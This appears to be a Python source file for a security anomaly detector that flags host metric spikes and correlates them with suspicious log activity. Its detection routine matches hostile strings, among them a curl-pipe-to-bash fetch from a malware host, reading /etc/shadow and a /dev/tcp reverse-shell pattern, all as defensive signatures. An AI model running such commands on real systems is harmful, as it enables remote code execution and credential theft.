from __future__ import annotations

from collections import deque
from dataclasses import dataclass
from datetime import timedelta
from statistics import mean, pstdev

from engine.schemas.alerts import DetectionAlert
from engine.schemas.events import NormalizedEvent
from engine.state import CorrelationState


@dataclass(slots=True)
class AnomalyDetector:
    model_id: str = "baseline.statistical.v1"
    warmup_samples: int = 20
    zscore_threshold: float = 4.0
    cooldown_seconds: int = 60
    fusion_window_seconds: int = 120
    supported_metrics: tuple[str, ...] = (
        "cpu_usage_pct",
        "mem_usage_pct",
        "network_io_kbs",
        "disk_io_kbs",
    )

    def evaluate(
        self, event: NormalizedEvent, state: CorrelationState
    ) -> list[DetectionAlert]:
        if event.event_type == "metric":
            return self._evaluate_metric_spike(event, state)
        if event.source_topic == "ocsf-events":
            return self._evaluate_host_fusion(event, state)
        return []

    def _evaluate_metric_spike(
        self, event: NormalizedEvent, state: CorrelationState
    ) -> list[DetectionAlert]:
        if event.event_type != "metric":
            return []
        if not event.host or not event.metric_name or event.metric_value is None:
            return []
        if event.metric_name not in self.supported_metrics:
            return []

        metric_history = state.metrics_by_host.get(event.host, {}).get(event.metric_name, [])
        baseline_values = metric_history[:-1] if metric_history else []
        if len(baseline_values) < self.warmup_samples:
            return []

        baseline_mean = mean(baseline_values)
        baseline_stddev = pstdev(baseline_values)
        if baseline_stddev == 0:
            return []

        zscore = (event.metric_value - baseline_mean) / baseline_stddev
        if zscore < self.zscore_threshold:
            return []

        anomaly_key = f"{event.host}:{event.metric_name}"
        cooldown_until = state.anomaly_cooldowns.get(anomaly_key)
        if cooldown_until is not None and event.timestamp < cooldown_until:
            return []

        state.anomaly_cooldowns[anomaly_key] = event.timestamp + timedelta(
            seconds=self.cooldown_seconds
        )
        state.remember_metric_anomaly(
            host=event.host,
            metric_name=event.metric_name,
            metric_value=event.metric_value,
            zscore=zscore,
            timestamp=event.timestamp,
        )

        return [
            DetectionAlert(
                title="Metric Spike Anomaly",
                description=(
                    f"Metric {event.metric_name} on host {event.host} exceeded the rolling baseline "
                    f"with z-score {zscore:.2f}."
                ),
                severity="medium",
                priority_score=72,
                detection_type="anomaly",
                attack_stage="impact",
                model_id=self.model_id,
                host=event.host,
                trace_id=event.trace_id,
                confidence=min(0.99, 0.6 + (zscore / 10.0)),
                suspected_cause="Observed metric value is significantly above the recent host baseline.",
                evidence=[
                    {"type": "metric_name", "value": event.metric_name},
                    {"type": "metric_value", "value": round(event.metric_value, 2)},
                    {"type": "baseline_mean", "value": round(baseline_mean, 2)},
                    {"type": "zscore", "value": round(zscore, 2)},
                ],
            )
        ]

    def _evaluate_host_fusion(
        self, event: NormalizedEvent, state: CorrelationState
    ) -> list[DetectionAlert]:
        if not event.host:
            return []

        recent_anomalies = state.recent_metric_anomalies.get(event.host, deque())
        if not recent_anomalies:
            return []

        suspicious_context = self._extract_suspicious_log_context(event)
        if suspicious_context is None:
            return []

        recent_metric = next(
            (
                item
                for item in reversed(recent_anomalies)
                if (event.timestamp - item["timestamp"]).total_seconds()
                <= self.fusion_window_seconds
            ),
            None,
        )
        if recent_metric is None:
            return []

        fusion_key = (
            f"fusion:{event.host}:{recent_metric['metric_name']}:"
            f"{suspicious_context['category']}:{suspicious_context['value']}"
        )
        if not state.mark_alert_fired(fusion_key):
            return []

        return [
            DetectionAlert(
                title="Host Metric and Log Fusion Anomaly",
                description=(
                    f"Host {event.host} had a recent metric spike in {recent_metric['metric_name']} "
                    f"followed by suspicious {suspicious_context['category']} activity."
                ),
                severity="high",
                priority_score=89,
                detection_type="anomaly",
                attack_stage="impact",
                model_id="baseline.fusion.v1",
                host=event.host,
                trace_id=event.trace_id,
                confidence=0.95,
                suspected_cause="Recent abnormal host metrics aligned with suspicious log activity.",
                evidence=[
                    {"type": "metric_name", "value": recent_metric["metric_name"]},
                    {"type": "metric_value", "value": round(recent_metric["metric_value"], 2)},
                    {"type": "metric_zscore", "value": round(recent_metric["zscore"], 2)},
                    {"type": suspicious_context["category"], "value": suspicious_context["value"]},
                ],
            )
        ]

    @staticmethod
    def _extract_suspicious_log_context(event: NormalizedEvent) -> dict[str, str] | None:
        message = event.message or ""
        http_path = (((event.raw_payload.get("http_request") or {}).get("url") or {}).get("path")) or ""
        api_endpoint = ((event.raw_payload.get("api") or {}).get("endpoint")) or ""

        if "curl http://malware.com/shell | bash" in message:
            return {"category": "process", "value": "curl http://malware.com/shell | bash"}
        if "cat /etc/shadow" in message:
            return {"category": "process", "value": "cat /etc/shadow"}
        if "/dev/tcp/" in message:
            return {"category": "cron", "value": "/dev/tcp/"}
        if api_endpoint == "/v2/internal/config":
            return {"category": "api_endpoint", "value": api_endpoint}
        if http_path in {"/api/v1/debug", "/cgi-bin/vulnerable.sh"}:
            return {"category": "http_path", "value": http_path}

        return None
